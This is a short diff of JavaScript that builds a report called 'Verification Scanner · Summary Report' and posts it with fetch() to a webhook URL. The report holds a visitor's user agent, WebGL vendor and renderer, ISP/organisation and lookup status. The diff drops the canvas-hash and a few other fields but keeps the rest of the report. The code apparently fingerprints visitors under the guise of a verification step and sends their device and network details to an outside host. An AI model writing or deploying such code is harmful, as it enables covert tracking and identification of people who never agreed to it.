@@ -174,7 +174,6 @@ await fetch(WEBHOOK_URL, {
         { name: "User Agent", value: `${basic.userAgent || "Unknown"}`, inline: false },
 
         // —— GRAPHICS ——
-        { name: "WebGL Supported", value: `${webgl.supported || "Unknown"}`, inline: true },
         { name: "WebGL Vendor", value: `${webgl.vendor || "Unknown"}`, inline: false },
         { name: "WebGL Renderer", value: `${webgl.renderer || "Unknown"}`, inline: false },
 
@@ -183,11 +182,6 @@ await fetch(WEBHOOK_URL, {
         { name: "ISP / Org", value: `${network.org || "Unknown"}`, inline: false },
         { name: "Lookup Status", value: `${network.lookupStatus || "Unknown"}`, inline: false },
 
-        // —— CANVAS ——
-        { name: "Canvas Hash", value: `${canvasFP || "Unknown"}`, inline: false },
-
-        // —— NOTES ——
-        { name: "Environment Notes", value: "None", inline: false }
       ],
       footer: {
         text: "Verification Scanner · Summary Report"
